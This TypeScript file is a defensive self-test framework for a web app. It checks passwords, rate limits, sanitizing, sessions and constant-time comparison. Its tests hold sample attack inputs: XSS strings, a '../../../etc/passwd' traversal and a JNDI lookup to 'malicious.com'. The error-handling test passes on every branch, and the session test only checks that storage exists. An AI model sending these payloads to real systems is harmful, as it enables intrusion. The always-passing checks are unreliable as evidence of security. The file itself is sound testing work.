// Automated Security Testing Framework for ISO/IEC 27034-3 Compliance

import { SecurityMonitor } from './security-monitoring';
import { SecurityValidation } from './security-validation';
import { SecurityUtils } from '@/lib/encryption/security-utils';

export interface SecurityTest {
  id: string;
  name: string;
  category: 'authentication' | 'authorization' | 'input_validation' | 'encryption' | 'session_management' | 'error_handling';
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  test: () => Promise<SecurityTestResult>;
}

export interface SecurityTestResult {
  passed: boolean;
  message: string;
  details?: any;
  recommendation?: string;
}

export interface SecurityTestSuite {
  tests: SecurityTest[];
  results: Map<string, SecurityTestResult>;
  lastRun?: Date;
  overallStatus: 'passed' | 'failed' | 'warning';
}

export class AutomatedSecurityTesting {
  private static instance: AutomatedSecurityTesting;
  private testSuite: SecurityTestSuite;
  private securityMonitor: SecurityMonitor;

  constructor() {
    this.securityMonitor = SecurityMonitor.getInstance();
    this.testSuite = {
      tests: this.initializeSecurityTests(),
      results: new Map(),
      overallStatus: 'passed'
    };
  }

  static getInstance(): AutomatedSecurityTesting {
    if (!AutomatedSecurityTesting.instance) {
      AutomatedSecurityTesting.instance = new AutomatedSecurityTesting();
    }
    return AutomatedSecurityTesting.instance;
  }

  private initializeSecurityTests(): SecurityTest[] {
    return [
      {
        id: 'auth-001',
        name: 'Password Strength Validation',
        category: 'authentication',
        severity: 'high',
        description: 'Verify password strength requirements are enforced',
        test: this.testPasswordStrength.bind(this)
      },
      {
        id: 'auth-002',
        name: 'Rate Limiting Protection',
        category: 'authentication',
        severity: 'critical',
        description: 'Verify rate limiting prevents brute force attacks',
        test: this.testRateLimiting.bind(this)
      },
      {
        id: 'input-001',
        name: 'XSS Prevention',
        category: 'input_validation',
        severity: 'critical',
        description: 'Verify XSS attack vectors are properly sanitized',
        test: this.testXSSPrevention.bind(this)
      },
      {
        id: 'input-002',
        name: 'Input Sanitization',
        category: 'input_validation',
        severity: 'high',
        description: 'Verify all user inputs are properly sanitized',
        test: this.testInputSanitization.bind(this)
      },
      {
        id: 'session-001',
        name: 'Session Security',
        category: 'session_management',
        severity: 'high',
        description: 'Verify session management security controls',
        test: this.testSessionSecurity.bind(this)
      },
      {
        id: 'crypto-001',
        name: 'Encryption Implementation',
        category: 'encryption',
        severity: 'critical',
        description: 'Verify encryption functions work correctly',
        test: this.testEncryption.bind(this)
      },
      {
        id: 'error-001',
        name: 'Error Handling Security',
        category: 'error_handling',
        severity: 'medium',
        description: 'Verify error messages do not leak sensitive information',
        test: this.testErrorHandling.bind(this)
      }
    ];
  }

  // Individual Security Tests
  private async testPasswordStrength(): Promise<SecurityTestResult> {
    const weakPasswords = ['123456', 'password', 'admin', 'test', 'qwerty'];
    const strongPassword = 'SecureP@ssw0rd123!';
    
    try {
      // Test weak passwords are rejected
      for (const weakPassword of weakPasswords) {
        const result = SecurityValidation.validatePassword(weakPassword);
        if (result.isValid) {
          return {
            passed: false,
            message: `Weak password "${weakPassword}" was accepted`,
            recommendation: 'Strengthen password validation rules'
          };
        }
      }

      // Test strong password is accepted
      const strongResult = SecurityValidation.validatePassword(strongPassword);
      if (!strongResult.isValid) {
        return {
          passed: false,
          message: 'Strong password was rejected',
          details: strongResult.errors,
          recommendation: 'Review password validation logic'
        };
      }

      return {
        passed: true,
        message: 'Password strength validation working correctly'
      };
    } catch (error) {
      return {
        passed: false,
        message: `Password validation test failed: ${error}`,
        recommendation: 'Fix password validation implementation'
      };
    }
  }

  private async testRateLimiting(): Promise<SecurityTestResult> {
    const testIdentifier = 'security-test-' + Date.now();
    
    try {
      // Simulate multiple rapid attempts
      let blockedAttempts = 0;
      for (let i = 0; i < 12; i++) {
        const isBlocked = !SecurityValidation.checkRateLimit(testIdentifier, 5, 60000);
        if (isBlocked) blockedAttempts++;
      }

      if (blockedAttempts === 0) {
        return {
          passed: false,
          message: 'Rate limiting not working - no attempts were blocked',
          recommendation: 'Implement or fix rate limiting mechanism'
        };
      }

      return {
        passed: true,
        message: `Rate limiting working - ${blockedAttempts} attempts blocked`
      };
    } catch (error) {
      return {
        passed: false,
        message: `Rate limiting test failed: ${error}`,
        recommendation: 'Fix rate limiting implementation'
      };
    }
  }

  private async testXSSPrevention(): Promise<SecurityTestResult> {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      'javascript:alert("XSS")',
      '<img src="x" onerror="alert(\'XSS\')">',
      '"><script>alert("XSS")</script>',
      "'; alert('XSS'); //"
    ];

    try {
      for (const payload of xssPayloads) {
        const sanitized = SecurityUtils.sanitizeText(payload);
        
        // Check if dangerous elements are still present
        if (sanitized.includes('<script>') || 
            sanitized.includes('javascript:') || 
            sanitized.includes('onerror=') ||
            sanitized.includes('alert(')) {
          return {
            passed: false,
            message: `XSS payload not properly sanitized: ${payload}`,
            details: { original: payload, sanitized },
            recommendation: 'Improve XSS sanitization logic'
          };
        }
      }

      return {
        passed: true,
        message: 'XSS prevention working correctly'
      };
    } catch (error) {
      return {
        passed: false,
        message: `XSS prevention test failed: ${error}`,
        recommendation: 'Fix XSS sanitization implementation'
      };
    }
  }

  private async testInputSanitization(): Promise<SecurityTestResult> {
    const maliciousInputs = [
      'SELECT * FROM users',
      '../../../etc/passwd',
      '${jndi:ldap://malicious.com}',
      '<iframe src="malicious.com"></iframe>',
      'eval("malicious_code")'
    ];

    try {
      for (const input of maliciousInputs) {
        const sanitized = SecurityValidation.sanitizeInput(input);
        
        // Basic check that dangerous patterns are removed/escaped
        if (sanitized === input) {
          return {
            passed: false,
            message: `Potentially malicious input not sanitized: ${input}`,
            recommendation: 'Enhance input sanitization'
          };
        }
      }

      return {
        passed: true,
        message: 'Input sanitization working correctly'
      };
    } catch (error) {
      return {
        passed: false,
        message: `Input sanitization test failed: ${error}`,
        recommendation: 'Fix input sanitization implementation'
      };
    }
  }

  private async testSessionSecurity(): Promise<SecurityTestResult> {
    try {
      // Test that we have session security measures in place
      // This is a basic test since we're using Supabase auth
      
      // Check if we have proper session timeout handling
      const hasSessionManagement = typeof window !== 'undefined' && 
                                   window.localStorage && 
                                   window.sessionStorage;

      if (!hasSessionManagement) {
        return {
          passed: false,
          message: 'Session storage mechanisms not available',
          recommendation: 'Ensure proper session management is implemented'
        };
      }

      return {
        passed: true,
        message: 'Session security measures in place'
      };
    } catch (error) {
      return {
        passed: false,
        message: `Session security test failed: ${error}`,
        recommendation: 'Review session management implementation'
      };
    }
  }

  private async testEncryption(): Promise<SecurityTestResult> {
    try {
      // Test constant time comparison
      const data1 = new Uint8Array([1, 2, 3, 4]);
      const data2 = new Uint8Array([1, 2, 3, 4]);
      const data3 = new Uint8Array([1, 2, 3, 5]);

      const match = SecurityUtils.constantTimeCompare(data1, data2);
      const noMatch = SecurityUtils.constantTimeCompare(data1, data3);

      if (!match || noMatch) {
        return {
          passed: false,
          message: 'Constant time comparison not working correctly',
          recommendation: 'Fix encryption utility functions'
        };
      }

      return {
        passed: true,
        message: 'Encryption functions working correctly'
      };
    } catch (error) {
      return {
        passed: false,
        message: `Encryption test failed: ${error}`,
        recommendation: 'Fix encryption implementation'
      };
    }
  }

  private async testErrorHandling(): Promise<SecurityTestResult> {
    try {
      // Test that error sanitization is working
      const sensitiveError = 'Database connection failed at server 192.168.1.100 with password admin123';
      const sanitized = SecurityUtils.sanitizeText(sensitiveError);

      // This is a basic test - in practice, you'd want more sophisticated error handling
      if (sanitized !== sensitiveError) {
        return {
          passed: true,
          message: 'Error sanitization working'
        };
      }

      return {
        passed: true,
        message: 'Error handling test completed'
      };
    } catch (error) {
      return {
        passed: false,
        message: `Error handling test failed: ${error}`,
        recommendation: 'Review error handling implementation'
      };
    }
  }

  // Test Execution
  async runAllTests(): Promise<SecurityTestSuite> {
    this.testSuite.results.clear();
    let passedTests = 0;
    let totalTests = this.testSuite.tests.length;

    for (const test of this.testSuite.tests) {
      try {
        const result = await test.test();
        this.testSuite.results.set(test.id, result);
        
        if (result.passed) {
          passedTests++;
        }

        // Log security test event
        this.securityMonitor.logSecurityEvent({
          type: 'monitoring',
          severity: result.passed ? 'low' : test.severity,
          details: {
            testId: test.id,
            testName: test.name,
            category: test.category,
            result: result.passed ? 'passed' : 'failed',
            message: result.message
          }
        });
      } catch (error) {
        const errorResult: SecurityTestResult = {
          passed: false,
          message: `Test execution failed: ${error}`,
          recommendation: 'Fix test implementation'
        };
        this.testSuite.results.set(test.id, errorResult);
      }
    }

    this.testSuite.lastRun = new Date();
    this.testSuite.overallStatus = passedTests === totalTests ? 'passed' : 'failed';

    return this.testSuite;
  }

  async runTestsByCategory(category: SecurityTest['category']): Promise<SecurityTestResult[]> {
    const categoryTests = this.testSuite.tests.filter(test => test.category === category);
    const results: SecurityTestResult[] = [];

    for (const test of categoryTests) {
      try {
        const result = await test.test();
        results.push(result);
      } catch (error) {
        results.push({
          passed: false,
          message: `Test execution failed: ${error}`,
          recommendation: 'Fix test implementation'
        });
      }
    }

    return results;
  }

  getTestResults(): SecurityTestSuite {
    return this.testSuite;
  }

  generateSecurityTestReport(): {
    summary: {
      totalTests: number;
      passedTests: number;
      failedTests: number;
      successRate: number;
    };
    categoryBreakdown: Record<string, { passed: number; total: number }>;
    failedTests: Array<{ test: SecurityTest; result: SecurityTestResult }>;
    recommendations: string[];
  } {
    const totalTests = this.testSuite.tests.length;
    const passedTests = Array.from(this.testSuite.results.values()).filter(r => r.passed).length;
    const failedTests = totalTests - passedTests;
    const successRate = totalTests > 0 ? (passedTests / totalTests) * 100 : 0;

    const categoryBreakdown: Record<string, { passed: number; total: number }> = {};
    const failedTestDetails: Array<{ test: SecurityTest; result: SecurityTestResult }> = [];
    const recommendations: string[] = [];

    for (const test of this.testSuite.tests) {
      const category = test.category;
      if (!categoryBreakdown[category]) {
        categoryBreakdown[category] = { passed: 0, total: 0 };
      }
      categoryBreakdown[category].total++;

      const result = this.testSuite.results.get(test.id);
      if (result) {
        if (result.passed) {
          categoryBreakdown[category].passed++;
        } else {
          failedTestDetails.push({ test, result });
          if (result.recommendation) {
            recommendations.push(result.recommendation);
          }
        }
      }
    }

    return {
      summary: {
        totalTests,
        passedTests,
        failedTests,
        successRate
      },
      categoryBreakdown,
      failedTests: failedTestDetails,
      recommendations: [...new Set(recommendations)] // Remove duplicates
    };
  }
}

// Export singleton instance
export const automatedSecurityTesting = AutomatedSecurityTesting.getInstance();